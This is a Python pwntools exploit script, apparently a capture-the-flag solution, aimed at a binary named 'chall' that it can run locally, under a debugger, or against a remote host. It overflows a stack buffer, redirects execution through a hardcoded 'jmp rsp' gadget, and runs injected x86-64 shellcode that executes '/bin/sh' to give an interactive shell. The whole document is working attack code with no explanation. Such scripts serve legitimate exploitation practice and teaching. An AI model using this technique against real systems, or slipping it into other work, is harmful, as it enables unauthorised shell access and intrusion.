from ctypes import PyDLL
import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.context.binary = pwn.ELF("./chall")

if pwn.args.GDB:
    p = pwn.gdb.debug(elf.path, '''c\n''')
elif pwn.args.REMOTE:
    p = pwn.remote("gc1.eng.run", 30910)
else:
    p = pwn.process(elf.path)

jmp_rsp = 0x000000000040127e
p.sendline(b"Esharky")
p.sendline(b"1")
payload = b'A'*0x20
payload += b'B'*8
payload += pwn.p64(jmp_rsp)
pwn.context.update(arch='amd64',os='linux')
shellcode = pwn.asm('''
    mov r12,0x0
    push r12
    push r12
    pop rsi
    pop rdx
    lea rdi,[rip+binsh]
    mov ax,0x3b
    syscall
binsh:
    .string "/bin/sh"
''')
print(pwn.hexdump(shellcode))
print(pwn.disasm(shellcode))
payload += shellcode
p.sendline(payload)
p.interactive()
